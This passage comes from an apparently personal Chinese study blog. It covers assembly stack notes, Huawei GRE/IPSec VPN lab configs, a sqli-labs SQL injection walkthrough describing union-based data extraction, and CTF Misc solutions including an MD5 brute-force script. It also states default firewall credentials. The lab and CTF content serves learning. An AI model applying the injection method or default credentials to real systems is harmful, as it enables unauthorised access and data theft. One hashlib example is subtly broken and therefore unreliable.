src="https://pic.imgdb.cn/item/667d15bdd9c307b7e94a072d.png" style="zoom:80%;"><img src="https://pic.imgdb.cn/item/667d184cd9c307b7e94e85b4.png" style="zoom:67%;"><p>pop是push的逆过程</p><p>push：先SP=SP-2，再放入数据</p><p>pop：先取出数据，再SP=SP+2</p><p><strong>注意</strong>：pop之后，数据其实依旧在，只是下一次push的时候，会将其覆盖</p><blockquote><p>当栈为空时，SP指向最高地址单元的下一个单元，这样当有数据进来，sp先减2，指向1000EH再将数据写入</p></blockquote><img src="https://pic.imgdb.cn/item/667d174dd9c307b7e94cd75a.png" style="zoom:67%;"><p>换个角度看：</p><img src="https://pic.imgdb.cn/item/667d1997d9c307b7e950d426.png" style="zoom:67%;"><img src="https://pic.imgdb.cn/item/667fd8c0d9c307b7e95eca43.png" style="zoom:67%;"><h3 id="栈顶越界的问题"><a href="#栈顶越界的问题" class="headerlink" title="栈顶越界的问题"></a>栈顶越界的问题</h3><blockquote><p>要根据可能用到的最大栈空间，来安排栈的大小，防止入栈的数据过多而导致超界</p><p>执行出栈时也要注意，以防栈空的时候出栈导致超界</p></blockquote><h3 id="push、pop指令"><a href="#push、pop指令" class="headerlink" title="push、pop指令"></a>push、pop指令</h3><p>push ds：将一个段寄存器中的数据入栈</p><p>pop ds：出栈，用一个段寄存器接收出栈的数据</p><p><img src="https://pic.imgdb.cn/item/6680fe30d9c307b7e9c40a50.png"></p><p><img src="https://pic.imgdb.cn/item/6680fe7ad9c307b7e9c45fbb.png"></p><p> <img src="https://pic.imgdb.cn/item/6680ffaed9c307b7e9c5e44a.png"></p><ul><li>mov ax,001AH</li><li>mov bx,001BH</li><li>mov cx,1000H</li><li>mov ss,cx</li><li>mov sp,0010H</li><li>push ax</li><li>push bx</li><li>mov ax,0</li><li>mov bx,0</li><li>pop bx</li><li>pop ax</li></ul><img src="https://pic.imgdb.cn/item/668102cad9c307b7e9cac72f.png" style="zoom:67%;"><p><img src="https://pic.imgdb.cn/item/66810376d9c307b7e9cb99b6.png"></p><ul><li>mov cx,1000H//段寄存器过渡</li><li>mov ss,cx</li><li>mov sp,0010H   //栈顶指针</li><li>mov ax,002AH  //赋值</li><li>mov bx,002BH</li><li>push ax               //入栈</li><li>push bx</li><li>mov ax,0             //清零</li><li>mov bx,0</li><li>pop ax                  //用ax来接收刚刚bx的数据</li><li>pop bx</li></ul><p><img src="https://pic.imgdb.cn/item/668106abd9c307b7e9cf64bb.png"></p><ul><li>mov ax,1000H</li><li>mov ss,ax</li><li>mov sp,2             //因为push之前先执行SP=SP-2，所以将栈顶指针指到10002H</li><li>mov ax,2266H</li><li>push ax</li></ul><img src="https://pic.imgdb.cn/item/66810673d9c307b7e9cf2521.png" style="zoom:67%;"><h3 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h3><blockquote><p>将一段内存当作栈段是我们自己安排的，CPU不会在执行push、pop时自动将我们定义的栈段当作栈空间来使用</p></blockquote><p><img src="https://pic.imgdb.cn/item/66810feed9c307b7e9da8107.png"></p><p><img src="https://pic.imgdb.cn/item/66810f9fd9c307b7e9da27f6.png"></p><h2 id="汇编语言程序"><a href="#汇编语言程序" class="headerlink" title="汇编语言程序"></a>汇编语言程序</h2><h3 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h3><blockquote><p>汇编指令：有对应的机器码的指令，可以被编译为机器指令，最终被CPU执行</p><p>伪指令：没有对应的机器码的指令，最终不被CPU所执行，它是由编译器来执行的指令</p></blockquote><ul><li>伪指令：</li></ul><p>segment和ends是一对成对使用的伪指令</p><p>功能是定义一个段，segment说明一个段开始，ends说明一个段结束</p><ul><li>伪指令使用格式：</li></ul><p>​段名segment</p><p>​段名ends</p><blockquote><p>一个汇编指令由多个段组成，这些段用来存放代码、数据 、当作栈空间来使用</p><p>一个有意义的汇编程序中至少有一个段，这个段用来存放代码</p><p>end是一个汇编程序的结束标记，编译器在编译过程中碰到end就结束对源程序的编译</p></blockquote><ul><li>assume:</li></ul><p>假设某一段寄存器和程序中的某一个segment……ends定义的段相关联</p><blockquote><p>源程序：源程序文件中的所有内容</p><p>程序：源程序中最终由计算机执行处理的指令或数据</p><p>程序最先以汇编指令的形式存在源程序中，经编译连接后变为机器码，存在可执行文件中</p></blockquote><img src="https://pic.imgdb.cn/item/668124a0d9c307b7e9f50371.png" style="zoom:67%;"><ul><li>标号：一个标号指代了一个地址</li><li>codesg放在segment前面，作为一个段的名称，他最终会被编译连接程序处理为一个段的段地址</li></ul><img src="https://pic.imgdb.cn/item/6681264cd9c307b7e9f6d51f.png" style="zoom:67%;"><blockquote><p>DOS是一个单任务操作系统</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPN技术</title>
      <link href="/2024/06/06/vpn-ji-zhu/"/>
      <url>/2024/06/06/vpn-ji-zhu/</url>
      
        <content type="html"><![CDATA[<h1 id="VPN技术"><a href="#VPN技术" class="headerlink" title="VPN技术"></a>VPN技术</h1><h2 id="VPN是干啥的"><a href="#VPN是干啥的" class="headerlink" title="VPN是干啥的"></a>VPN是干啥的</h2><blockquote><p>==官方解释==：</p><p>​VPN（Virtual Private Network，虚拟专用网络）技术是一种可以在公共网络上建立安全的、加密的连接，使用户可以通过网络访问私有网络资源的技术。VPN技术通过在用户和目标网络之间建立加密隧道来确保数据传输的安全性和私密性，避免了数据在互联网上传输时被非法获取或篡改的风险。<br>​VPN技术的主要作用包括：提供加密保护的网络连接、绕过地理位置限制、保护隐私和匿名性、保护数据传输的安全性。在实际应用中，VPN技术广泛应用于企业内部网络、远程办公、跨国公司的分支机构连接、绕过地域限制的访问等场景。</p><p>==我的理解==：</p><p>​首先，先明白ipv4地址是有限的，并且从ipv4过渡到ipv6的过程是漫长的，所以就出现了NAT技术（地址转换），所以也就有了公网地址和私网地址之分，公网地址就是可以在公共的Internet上传数据的IP地址，私网地址就是只能在本地进行数据传输的ip地址。<br>​但是，当你想要提供安全的传输，数据不被篡改，就可以建立VPN隧道来保障。<br>​两个公司一个总部，一个分部，他们之间可以建立VPN隧道，这样他们就可以看作在同一个网段通信了</p></blockquote><h2 id="VPN的分类"><a href="#VPN的分类" class="headerlink" title="VPN的分类"></a>VPN的分类</h2><h3 id="GRE"><a href="#GRE" class="headerlink" title="GRE"></a>GRE</h3><blockquote><p>最大的优点：兼容性强，不管是单播、广播都可以打通，第二个优点就是简单，利于学习</p><p>缺点：不安全</p></blockquote><p>给数据包加上一个新头部来实现隧道传输</p><blockquote><p>举个例子：</p><p>总部和分公司，源地址192.168.1.x（私网地址），目标地址172.16.1.x（私网地址）</p><p>加一个新头部，源地址64.1.1.1（出口路由器公网地址），目标地址202.1.1.1（出口路由器公网地址）</p><p>数据包送到分公司的出口路由器，路由器将外层报头拆掉，露出真实目标地址</p></blockquote><h4 id="配置实战"><a href="#配置实战" class="headerlink" title="配置实战"></a>配置实战</h4><p>实验拓扑图：</p><img src="https://pic.imgdb.cn/item/66728d6ed9c307b7e954a06d.png" style="zoom: 67%;"><p>出口路由器AR1上作配置:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]int Tunnel 0/0/0//创建隧道接口</span><br><span class="line">[Huawei-Tunnel-0/0/0]tunnel-protocol gre//隧道协议为gre</span><br><span class="line">[Huawei-Tunnel-0/0/0]source 64.1.1.1//隧道源地址(公网ip)</span><br><span class="line">[Huawei-Tunnel-0/0/0]destination 202.1.1.1      //隧道目的地址(公网ip)</span><br><span class="line">[Huawei-Tunnel-0/0/0]ip add 10.1.1.1 24//创建隧道口的虚拟ip</span><br><span class="line">[Huawei]dis ip int b//查看接口信息</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/66728d29d9c307b7e9542d26.png"></p><p>出口路由器AR2上作相对应配置:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]int Tunnel 0/0/0//创建隧道接口</span><br><span class="line">[Huawei-Tunnel-0/0/0]tunnel-protocol gre//隧道协议为gre</span><br><span class="line">[Huawei-Tunnel-0/0/0]source 202.1.1.1//隧道源地址(公网ip)</span><br><span class="line">[Huawei-Tunnel-0/0/0]destination 64.1.1.1       //隧道目的地址(公网ip)</span><br><span class="line">[Huawei-Tunnel-0/0/0]ip add 10.1.1.2 24//创建隧道口的虚拟ip</span><br></pre></td></tr></tbody></table></figure><p>出口路由器配置静态路由：</p><p>AR1:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]ip route-static 172.16.1.0 24 10.1.1.2//下一跳写隧道对端的虚拟ip</span><br></pre></td></tr></tbody></table></figure><p>AR2:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]ip route-static 192.168.1.0 24 10.1.1.1//下一跳写隧道对端的虚拟ip</span><br></pre></td></tr></tbody></table></figure><p>抓包分析：</p><img src="https://pic.imgdb.cn/item/66728f18d9c307b7e9579c58.png" style="zoom:200%;"><h4 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h4><ol><li>明文传输，数据未加密，容易被窃取</li><li>没有完整性验证，没有防篡改功能</li><li>没有身份验证</li></ol><p>进而可以用IPSec</p><h3 id="IPSec"><a href="#IPSec" class="headerlink" title="IPSec"></a>IPSec</h3><blockquote><p>防火墙有安全域（信任，不信任）</p><p>优点：</p><ul><li><p>数据加密，即使被截胡，也看不懂</p></li><li><p>哈希，防篡改</p></li><li><p>身份验证</p></li></ul></blockquote><h4 id="配置实战-1"><a href="#配置实战-1" class="headerlink" title="配置实战"></a>配置实战</h4><p>实验拓扑图：</p><img src="https://pic.imgdb.cn/item/66729290d9c307b7e95f29ec.png" style="zoom:67%;"><blockquote><p>防火墙默认账号：admin，密码：admin@123</p></blockquote><p>配置防火墙接口地址……</p><p>配置FW1默认路由：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[USG6000V1]ip route-static 0.0.0.0 0 64.1.1.2</span><br></pre></td></tr></tbody></table></figure><p>配置FW2默认路由：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[USG6000V1]ip route-static 0.0.0.0 0 202.1.1.2</span><br></pre></td></tr></tbody></table></figure><p>配置FW1与FW2安全域</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[USG6000V1]firewall zone trust //配置信任域</span><br><span class="line">[USG6000V1-zone-trust]add int g0/1/0//将接口加入信任域</span><br><span class="line">[USG6000V1]firewall zone untrust//配置非信任域</span><br><span class="line">[USG6000V1-zone-untrust]add int g1/0/0//将接口加入信任域</span><br></pre></td></tr></tbody></table></figure><p>配置FW1与FW2安全策略</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[USG6000V1]security-policy //进入安全策略</span><br><span class="line">[USG6000V1-policy-security]rule name 123 //新建策略名称</span><br><span class="line">[USG6000V1-policy-security-rule-123]action permit//放行所有</span><br><span class="line">[USG6000V1]int g1/0/0</span><br><span class="line">[USG6000V1-g1/0/0]service-manage ping permit//允许接口被ping</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> VPN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>封神台高校CTF练习（Web靶场）</title>
      <link href="/2024/06/04/feng-shen-tai-gao-xiao-ctf-lian-xi-web-ba-chang/"/>
      <url>/2024/06/04/feng-shen-tai-gao-xiao-ctf-lian-xi-web-ba-chang/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF练习 </category>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-sqli-labs-master练习</title>
      <link href="/2024/05/29/sqli-labs-master/"/>
      <url>/2024/05/29/sqli-labs-master/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入-sqli-labs-master练习"><a href="#SQL注入-sqli-labs-master练习" class="headerlink" title="SQL注入-sqli-labs-master练习"></a>SQL注入-sqli-labs-master练习</h1><h2 id="Less-1（基于错误的GET单引号字符型注入）"><a href="#Less-1（基于错误的GET单引号字符型注入）" class="headerlink" title="Less-1（基于错误的GET单引号字符型注入）"></a>Less-1（基于错误的GET单引号字符型注入）</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">联合查询注⼊流程&nbsp;</span><br><span class="line">1、判断原有查询语句字段数数</span><br><span class="line">2、使原来查询语句的查询结果为空</span><br><span class="line">3、判断查询结果输出位置</span><br><span class="line">4、使⽤ union 操作符拼接 payload 语句</span><br><span class="line">5、利⽤ payload 进⾏数据查询</span><br></pre></td></tr></tbody></table></figure><blockquote><p>显示正常页面</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f1e4a5e6d1bfa059237d2.png"></p><blockquote><p>找注入点，破坏SQL语法结构，发现存在注入点，并且为字符型</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f1e9f5e6d1bfa0592d24e.png" alt="不为数字型"></p><p><img src="https://pic.imgdb.cn/item/665f1dca5e6d1bfa059120fe.png" alt="字符型"></p><blockquote><p>用联合查询，需要知道对应的列数，于是用order by判断列数<br>先用10列来测，回显不对，于是二分继续测试</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f1fd85e6d1bfa05944713.png"></p><blockquote><p>测试出有3列</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f20645e6d1bfa0594e49e.png"></p><blockquote><p>用union查询，判断回显位置，回显位置为2，3</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f210c5e6d1bfa0595a8a2.png"></p><blockquote><p>查数据库名称</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f213e5e6d1bfa0595e6ab.png" alt="查数据库名"></p><blockquote><p>查数据表名</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在 mysql5.0 以上的版本中加⼊了 information_schema 这个系统库，该库内存放该数据库所有的库名，表名，字段名以及它们的从属关系，利⽤ information_schema 库可以查询当前数据所有的表名</span><br><span class="line">用group_concat()函数显示所有表名</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/665f22965e6d1bfa05975f44.png" alt="查数据表名"></p><blockquote><p>用户信息在表“users”里，于是查其字段名</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f23265e6d1bfa0597fc97.png" alt="查字段名"></p><blockquote><p>查用户数据</p></blockquote><p><img src="https://pic.imgdb.cn/item/665f23ab5e6d1bfa05988597.png" alt="查数据"></p><h2 id="Less-2（基于错误的GET整型注入）"><a href="#Less-2（基于错误的GET整型注入）" class="headerlink" title="Less-2（基于错误的GET整型注入）"></a>Less-2（基于错误的GET整型注入）</h2><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>封神台高校CTF练习（Misc入门靶场）</title>
      <link href="/2024/05/29/feng-shen-tai-gao-xiao-ctf-lian-xi-misc-ru-men-ba-chang/"/>
      <url>/2024/05/29/feng-shen-tai-gao-xiao-ctf-lian-xi-misc-ru-men-ba-chang/</url>
      
        <content type="html"><![CDATA[<h1 id="封神台高校CTF练习（Misc入门靶场）"><a href="#封神台高校CTF练习（Misc入门靶场）" class="headerlink" title="封神台高校CTF练习（Misc入门靶场）"></a>封神台高校CTF练习（Misc入门靶场）</h1><hr><h3 id="封神台练习平台"><a href="#封神台练习平台" class="headerlink" title="封神台练习平台"></a><a href="https://hack.zkaq.cn/">封神台练习平台</a></h3><h2 id="用到的工具平台"><a href="#用到的工具平台" class="headerlink" title="==用到的工具平台=="></a>==用到的工具平台==</h2><p>Unicode加解密：<a href="https://www.toolhelper.cn/EncodeDecode/UnicodeChinese">https://www.toolhelper.cn/EncodeDecode/UnicodeChinese</a><br>RC4加解密：<a href="https://www.lddgo.net/encrypt/rc4">在线RC4加密解密 (lddgo.net)</a><br>MD5加解密：<a href="https://www.cmd5.com/default.aspx">md5在线解密破解,md5解密加密 (cmd5.com)</a><br>凯撒密码加解密：<a href="https://www.lddgo.net/encrypt/caesar-cipher">在线凯撒密码加密解密 (lddgo.net)</a><br>核心价值观加解密平台：<a href="http://www.hiencode.com/cvencode.html">CTF在线工具-在线核心价值观编码|核心价值观编码算法|Core Values Encoder (hiencode.com)</a><br>栅栏加解密平台：（<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a>）<br>Base加解密平台：<a href="http://www.hiencode.com/base64.html">CTF在线工具-在线base编码|在线base解码|base16编码|base32编码|base64编码 (hiencode.com)</a><br>百度识图：<a href="https://graph.baidu.com/pcpage/index?tpl_from=pc">https://graph.baidu.com/pcpage/index?tpl_from=pc</a></p><h2 id="（1）杂项1：图片隐写"><a href="#（1）杂项1：图片隐写" class="headerlink" title="（1）杂项1：图片隐写"></a>（1）杂项1：图片隐写</h2><p> <img src="https://pic.imgdb.cn/item/665715c4d9c307b7e93f60fd.png"></p><ul><li><p>步骤</p><blockquote><p>将图片下载到本地，并且用文本文档（.txt）打开并查看源码</p></blockquote><p>  <img src="https://pic.imgdb.cn/item/66571ca6d9c307b7e9485bcc.png" alt="图片"></p><blockquote><p>查看源码，发现有Unicode码</p></blockquote>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#107;&amp;#101;&amp;#121;&amp;#123;&amp;#122;&amp;#45;&amp;#110;&amp;#115;&amp;#100;&amp;#105;&amp;#117;&amp;#97;&amp;#125;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>在网上搜一个Unicode码解码工具（<a href="https://www.toolhelper.cn/EncodeDecode/UnicodeChinese">Unicode与中文 编码/解码 - 锤子在线工具 (toolhelper.cn)</a> ，并解码</p></blockquote><p>  <img src="https://pic.imgdb.cn/item/66571e63d9c307b7e94a21a2.png" alt="解码"></p><blockquote><p>得到flag</p></blockquote>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key{z-nsdiua}</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="（2）杂项2：密文在这里-看看你是否能解开"><a href="#（2）杂项2：密文在这里-看看你是否能解开" class="headerlink" title="（2）杂项2：密文在这里,看看你是否能解开"></a>（2）杂项2：密文在这里,看看你是否能解开</h2><p><img src="https://pic.imgdb.cn/item/66572105d9c307b7e94cc375.png"></p><p>==RC4原理：==</p><p>RC4（Rivest Cipher 4）是一种流密码（stream cipher）算法，用于加密和解密数据。它由Ron Rivest设计并于1987年发布。RC4算法的核心是通过对称密钥生成伪随机位流（pseudo-random stream），然后将明文与该位流进行抑或（XOR）运算来实现加密和解密。</p><p>具体来说，RC4算法包括以下步骤：</p><ol><li><strong>密钥调度算法（Key Scheduling Algorithm，KSA）</strong>：根据输入的密钥，生成一个密钥调度表（S-box），用于后续的伪随机位流生成。</li><li><strong>伪随机生成算法（Pseudo-Random Generation Algorithm，PRGA）</strong>：利用密钥调度表生成一个伪随机位流，该位流的元素会被用作加密过程中的“密钥流”。</li><li><strong>加密/解密</strong>：将明文与伪随机位流进行逐位的抑或运算，以实现加密或解密操作。</li></ol><p>在使用RC4算法时，需要注意以下几点：</p><ul><li>密钥的选择和管理非常重要，弱密钥会导致加密的不安全性。</li><li>加密和解密使用相同的密钥。</li><li>在实际应用中，通常需要引入初始化向量（Initialization Vector，IV）来提高安全性。</li></ul><p>总的来说，RC4算法是一种快速且简单的加密算法，但由于存在一些安全性方面的问题，如密钥漏洞和偏差等，现在已不推荐作为加密标准使用。</p><ul><li><p>步骤：</p><blockquote><p>RC4解密是需要密钥的，所以需要寻找密钥，题中一个声音在耳边响起，看一下自己的键盘，他好像在组成某种神秘的组合（rtygcvb ，ujmko，ujmko），跟着他的字母在键盘上对一下，于是前两个组成了两个字母</p></blockquote></li></ul><p><img src="https://pic.imgdb.cn/item/665723b9d9c307b7e94fbc8b.jpg"></p><blockquote><p>重复敲击两次，那么猜测密钥为zvvzvv,并在网上找一个RC4解密工具解密（<a href="https://www.lddgo.net/encrypt/rc4">在线RC4加密解密 (lddgo.net)</a>）</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文：M6UUSlt6rxWO328Kez8xXCMd</span><br></pre></td></tr></tbody></table></figure><blockquote><p>输入密钥，将字符集选择为UTF-8，输入格式为base64，输出格式为字符串（string）</p></blockquote><p><img src="https://pic.imgdb.cn/item/665725e7d9c307b7e9521dbe.png" alt="RC4解密"></p><blockquote><p>得到flag</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key{zkz-good-kkey}</span><br></pre></td></tr></tbody></table></figure><h2 id="（3）杂项3：一段特殊的ascii密文"><a href="#（3）杂项3：一段特殊的ascii密文" class="headerlink" title="（3）杂项3：一段特殊的ascii密文"></a>（3）杂项3：一段特殊的ascii密文</h2><p><img src="https://pic.imgdb.cn/item/665726bdd9c307b7e953599f.png"></p><ul><li>步骤：</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">83,121,110,116,71,115,121,110,116,136,135,120,135,108,110,126,115,112,63,61,63,62,108,67,63,69,108,76,76,76,76,138,90,113,66,71,112,110,66,62,62,67,112,112,66,111,112,67,113,63,110,114,69,66,65,110,111,111,113,68,61,63,112,69,68,68,68</span><br></pre></td></tr></tbody></table></figure><blockquote><p>首先，猜测flag是以“flag”开头的，且121,110,116三个数在2，3，4位置和在7，8，9位置都在，那么先将flag转换为ascii码，为102，108，97，103，</p><p>102（+6）108（-11）97（+6）103</p><p>121（-11）110（+6）116</p><p>那么可以看出108，97，103和121，110，116之间的差距是相同的，那么121-108=13，将所有数字-13</p></blockquote><blockquote><p>那么写一个python代码，将这些整数转化为ascii码</p></blockquote><p><img src="https://pic.imgdb.cn/item/66572bf9d9c307b7e95b1749.png" alt="代码运行图"></p><p>代码：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">83</span>,<span class="number">121</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">71</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">136</span>,<span class="number">135</span>,<span class="number">120</span>,<span class="number">135</span>,</span><br><span class="line">   <span class="number">108</span>,<span class="number">110</span>,<span class="number">126</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">63</span>,<span class="number">61</span>,<span class="number">63</span>,<span class="number">62</span>,<span class="number">108</span>,<span class="number">67</span>,<span class="number">63</span>,<span class="number">69</span>,<span class="number">108</span>,</span><br><span class="line">   <span class="number">76</span>,<span class="number">76</span>,<span class="number">76</span>,<span class="number">76</span>,<span class="number">138</span>,<span class="number">90</span>,<span class="number">113</span>,<span class="number">66</span>,<span class="number">71</span>,<span class="number">112</span>,<span class="number">110</span>,<span class="number">66</span>,<span class="number">62</span>,<span class="number">62</span>,<span class="number">67</span>,</span><br><span class="line">   <span class="number">112</span>,<span class="number">112</span>,<span class="number">66</span>,<span class="number">111</span>,<span class="number">112</span>,<span class="number">67</span>,<span class="number">113</span>,<span class="number">63</span>,<span class="number">110</span>,<span class="number">114</span>,<span class="number">69</span>,<span class="number">66</span>,<span class="number">65</span>,<span class="number">110</span>,</span><br><span class="line">   <span class="number">111</span>,<span class="number">111</span>,<span class="number">113</span>,<span class="number">68</span>,<span class="number">61</span>,<span class="number">63</span>,<span class="number">112</span>,<span class="number">69</span>,<span class="number">68</span>,<span class="number">68</span>,<span class="number">68</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    j = <span class="built_in">chr</span>(i-<span class="number">13</span>)</span><br><span class="line">    <span class="comment"># chr()函数用于返回指定整数对应的ASCII字符</span></span><br><span class="line">    flag=flag+j</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>得到部分的flag，md5值其实最后还有个d，这个d其实也是可以跑出来的</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag:flag{zkz_aqfc2021_628_????}Md5:ca5116cc5bc6d2ae854abbd702c8777d</span><br></pre></td></tr></tbody></table></figure><blockquote><p>这里的一个思路就是尝试用md5解密工具（<a href="https://www.cmd5.com/default.aspx">md5在线解密破解,md5解密加密 (cmd5.com)</a>），但是是不成功的，因为数据源是无穷尽的，而 MD5密文是有限的。</p><p>那么这里我就查看了平台的解题思路：标准的md5碰撞，写一个碰撞脚本（碰撞需要一段时间，耐心等待）</p></blockquote><p><img src="https://pic.imgdb.cn/item/66573179d9c307b7e961bb4b.png" alt="MD5碰撞脚本运行"></p><p>代码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">flag_md5 = 'ca5116cc5bc6d2ae854abbd702c8777d'</span><br><span class="line">strs = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()" \</span><br><span class="line">       "*+,-./:;&lt;=&gt;?@[\]^_`{|}~ "</span><br><span class="line">for a in strs:</span><br><span class="line">    for b in strs:</span><br><span class="line">        for c in strs:</span><br><span class="line">            for d in strs:</span><br><span class="line">                md5 = hashlib.md5()</span><br><span class="line">                flag = 'flag{zkz_aqfc2021_628_' +str(a)+str(b)+str(c)+str(d)+'}'</span><br><span class="line">                md5.update(flag.encode())</span><br><span class="line">                if md5.hexdigest() == flag_md5:</span><br><span class="line">                    print(flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>得到flag</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{zkz_aqfc2021_628_zxcv}</span><br></pre></td></tr></tbody></table></figure><h3 id="杂项3学习资料补充"><a href="#杂项3学习资料补充" class="headerlink" title="杂项3学习资料补充"></a>杂项3学习资料补充</h3><p>==hashlib库==</p><ul><li><p>hashlib库是Python的一个标准库，用于提供哈希算法。其中包含多种哈希算法，如MD5、SHA-1、SHA-256等。</p></li><li><p>MD5 (Message Digest Algorithm 5) 是一种广泛使用的哈希算法，用于将任意长度的输入数据生成一个128位的哈希值。它具有以下特点：</p><ol><li><p>不可逆：无法从生成的哈希值还原出原始数据。</p></li><li><p>唯一性：不同的输入数据生成的哈希值几乎不会相同。</p></li><li><p>高效性：计算速度快，适合用于检查数据完整性。</p></li></ol></li></ul><p>在Python中，可以使用<code>hashlib</code>库中的<code>md5()</code>函数来计算数据的MD5哈希值，示例代码如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">data = <span class="string">'Hello, World!'</span></span><br><span class="line">md5_hash = hashlib.md5(data).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"MD5 hash value:"</span>, 